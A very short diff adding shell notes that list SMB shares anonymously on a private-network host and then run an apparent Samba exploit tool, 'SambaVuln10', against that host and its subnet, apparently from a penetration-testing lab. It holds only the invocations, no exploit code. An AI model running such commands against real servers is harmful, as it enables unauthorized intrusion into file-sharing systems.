@@ -1,0 +1,7 @@
+# smbclient -L 192.168.75.14 -N
+
+
+
+./SambaVuln10 -v -d 0 -S 192.168.75
+
+./SambaVuln10 -b 0 -v 192.168.75.14
